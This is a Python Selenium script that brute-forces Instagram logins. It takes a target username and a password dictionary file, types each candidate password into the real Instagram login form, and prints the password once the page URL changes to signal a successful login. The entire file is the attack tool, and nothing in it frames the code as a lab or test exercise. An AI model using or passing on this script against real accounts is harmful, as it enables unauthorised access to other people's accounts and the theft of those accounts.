from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

username = input('Username: ')
dictionary = input('Choose Dictionary: ')

file = open(f'{dictionary}.txt', 'r')
bruteforce = []
for line in file:
    line = line.strip()
    bruteforce.append(line)
file.close()

driver = webdriver.Chrome()  # This will launch the Chrome browser.

driver.get('https://www.instagram.com/')
time.sleep(3)

login_link = WebDriverWait(driver, 10).until(
    EC.presence_of_element_located((By.XPATH, '//*[@aria-label="Phone number, username, or email"]'))
)
login_link.click()
time.sleep(2)

username_input = driver.switch_to.active_element
username_input.send_keys(username)
time.sleep(1)
username_input.send_keys(Keys.TAB)
time.sleep(1)

for brute in bruteforce:
    password_input = driver.find_element(By.NAME, 'password')
    password_input.send_keys(Keys.CONTROL + 'a')  # Select all existing text in the password field.
    password_input.send_keys(Keys.DELETE)  # Delete the selected text (clear the password field).
    password_input.send_keys(brute)  # Enter the new password.
    time.sleep(1)
    password_input.send_keys(Keys.ENTER)
    time.sleep(5)  # Increase the wait time for login verification.

    if driver.current_url != 'https://www.instagram.com/':
        print(f"Login successful! Password: {brute}")
        break  # Stop brute force attempt if login is successful.

print("Brute force attempt completed.")
